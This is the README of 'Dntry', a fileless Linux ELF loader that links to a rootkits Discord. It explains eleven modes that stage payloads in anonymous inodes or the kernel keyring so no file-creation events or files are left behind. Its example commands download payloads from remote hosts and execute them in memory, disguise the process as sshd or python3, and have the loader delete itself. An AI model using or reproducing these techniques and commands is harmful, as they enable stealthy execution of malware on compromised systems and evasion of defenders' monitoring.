# Dntry

<img src="https://i.imgur.com/O15awdJ.png" alt="Dntry" width="600"/>

Fileless ELF loader with eleven execution modes across four techniques.

- https://discord.gg/rootkits

## Techniques

**O_TMPFILE + execveat(AT_EMPTY_PATH)**
Allocates an anonymous inode on a real filesystem with no directory entry, writes the payload into it, and executes via `execveat` with `AT_EMPTY_PATH`. No `memfd_create`, no named file. Since the anonymous inode is never linked into the directory tree, no `IN_CREATE` or `FAN_CREATE` event is generated. Process shows as `/tmp/#N (deleted)` in telemetry.

**Kernel keyring (user) + userland exec**
Stores the ELF payload in kernel slab memory via `add_key("user")` with no fd, no inode and no VFS involvement. The payload is read back via `keyctl(KEYCTL_READ)`, the key is revoked, and the ELF is loaded manually by walking PT_LOAD segments and jumping to the entry point with no `execve` or `execveat` call. Payload limit ~20 KB (per-user quota).

**Kernel keyring (big_key) + userland exec**
Same as above but uses `add_key("big_key")` which stores payloads up to 1 MiB. Above a small internal threshold the kernel stages the data in an encrypted kernel tmpfs rather than plain slab. Requires `CONFIG_BIG_KEYS=y` (default on Ubuntu Server, RHEL 8/9; not set on Kali). Returns `ENODEV` if unavailable.

**Cross-process staging (stage + load)**
`stage` stores the ELF in the session keyring and prints the key ID, then exits. A completely separate process later runs `load <key_id>` to pull the bytes from kernel slab and execute. The payload lives only in kernel memory between the two processes: no shared memory, no socket, no file between them. `KEY_SPEC_SESSION_KEYRING` is inherited across `fork`/`exec` within the same PAM session, so the key survives after the dropper dies.

## Requirements

| | |
|---|---|
| Kernel | 4.17+ (O_TMPFILE + execveat + MAP_FIXED_NOREPLACE) |
| Compiler | gcc |
| Build tools | make |
| HTTPS (optional) | libssl-dev |

```sh
sudo apt install gcc make
sudo apt install libssl-dev  # for HTTPS
```

## Build

```sh
make          # HTTP only
make https    # with HTTPS support
make bebop    # test payload (sleeps 30s, prints PID)
make demo     # diagnostic payload (prints pid, exe, maps)
```

## Usage

```sh
# O_TMPFILE + execveat
./dntry file  <elf>  [spoof_name]
./dntry http  <url>  [spoof_name]
./dntry stdin [spoof_name]

# Keyring user (~20 KB quota) + userland exec
./dntry kfile  <elf>  [spoof_name]
./dntry khttp  <url>  [spoof_name]
./dntry kstdin [spoof_name]

# Keyring big_key (up to 1 MiB, requires CONFIG_BIG_KEYS=y) + userland exec
./dntry bkfile  <elf>  [spoof_name]
./dntry bkhttp  <url>  [spoof_name]
./dntry bkstdin [spoof_name]

# Cross-process staging: dropper stores payload and exits, loader executes later
./dntry stage <elf>
./dntry load  <key_id> [spoof_name]
```

`spoof_name` becomes `argv[0]` of the loaded process and the thread name via `prctl(PR_SET_NAME)`, defaults to `python3`.

## Examples

```sh
cat payload.elf | ./dntry kstdin sshd

./dntry khttp https://temp.sh/aBcDe/payload sshd

./dntry http http://192.168.1.10:8080/payload python3

# Cross-process staging: dropper writes payload and exits
KEY=$(./dntry stage payload.elf)

# key survives in kernel slab after dropper is dead:
# 23214cfe I--Q---  user  _dntry: 9808

# loader runs later with no shared memory between the two
./dntry load $KEY sshd
```

## Keyring limits

| Mode | Key type | Max payload | Requires |
|------|----------|------------|---------|
| `kfile/khttp/kstdin` | `user` | ~20 KB (per-user quota) | nothing extra |
| `bkfile/bkhttp/bkstdin` | `big_key` | 1 MiB | `CONFIG_BIG_KEYS=y` |
| `stage/load` | `user` | ~20 KB (per-user quota) | nothing extra |

The default per-user quota is 20000 bytes via `/proc/sys/kernel/keys/maxbytes`. Root has a separate quota of 25 MB via `/proc/sys/kernel/keys/root_maxbytes`.

`big_key` returns `ENODEV` when `CONFIG_BIG_KEYS` is not compiled in. For payloads above 1 MiB use the O_TMPFILE modes instead.

## How it works (O_TMPFILE path)

1. `open("/tmp", O_TMPFILE|O_RDWR, 0700)` allocates an anonymous inode with no directory entry
2. Payload bytes are written into the fd
3. The fd is reopened read-only via `/proc/self/fd/` to clear the write flag (`ETXTBSY`)
4. `prctl(PR_SET_NAME)` and cmdline overwrite spoof the process identity
5. Loader unlinks itself via `readlink("/proc/self/exe")`
6. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` executes the fd directly with no path string

## How it works (keyring path)

1. `add_key("user"|"big_key", "_dntry", elf_bytes, size, KEY_SPEC_SESSION_KEYRING)` stores the ELF in kernel memory with no fd or VFS involvement
2. `keyctl(KEYCTL_READ)` is called twice: first as a size probe, then to copy into an anonymous mapping
3. `keyctl(KEYCTL_REVOKE)` frees the kernel copy
4. PT_LOAD segments are mapped into anonymous memory with `MAP_FIXED_NOREPLACE`
5. `prctl(PR_SET_NAME)` and cmdline overwrite spoof the process identity
6. Loader unlinks itself via `readlink("/proc/self/exe")`
7. Registers are zeroed and execution jumps to the ELF entry point

`big_key` above a small internal threshold stores the payload in an encrypted kernel tmpfs instead of plain slab.

## How it works (stage + load)

`stage` runs step 1 only: stores the ELF and prints the key ID to stdout, then exits. The payload stays in kernel slab memory after the process dies because `KEY_SPEC_SESSION_KEYRING` is attached to the PAM session, not to any process.

`load <key_id>` runs steps 2–7 in a completely separate process. Between `stage` exiting and `load` running, the payload exists only inside the kernel: no file, no fd, no shared memory, no socket between the two processes. The two processes are fully decoupled.
